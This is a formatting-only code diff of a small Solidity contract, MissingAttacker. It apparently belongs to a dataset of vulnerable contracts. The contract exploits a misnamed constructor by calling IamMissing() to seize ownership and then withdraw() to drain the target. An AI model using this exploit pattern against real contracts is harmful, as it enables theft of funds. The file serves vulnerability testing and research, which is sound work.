@@ -1,9 +1,8 @@
- pragma solidity ^0.4.15;
+pragma solidity ^0.4.15;
 
- import "../dataset/access_control/incorrect_constructor_name1.sol";
+import "../dataset/access_control/incorrect_constructor_name1.sol";
 
- contract MissingAttacker{
-    
+contract MissingAttacker {
     Missing target;
 
     constructor(address _target) public {
@@ -11,8 +10,10 @@
     }
 
     function attack() public {
-        bytes memory data = abi.encodeWithSelector(bytes4(keccak256("IamMissing()")));
-        
+        bytes memory data = abi.encodeWithSelector(
+            bytes4(keccak256("IamMissing()"))
+        );
+
         (bool success, ) = target.call(data);
         require(success, "Attack failed");
     }
@@ -21,7 +22,5 @@
         target.withdraw();
     }
 
-    function () public payable {
-    }
-
- }
+    function() public payable {}
+}
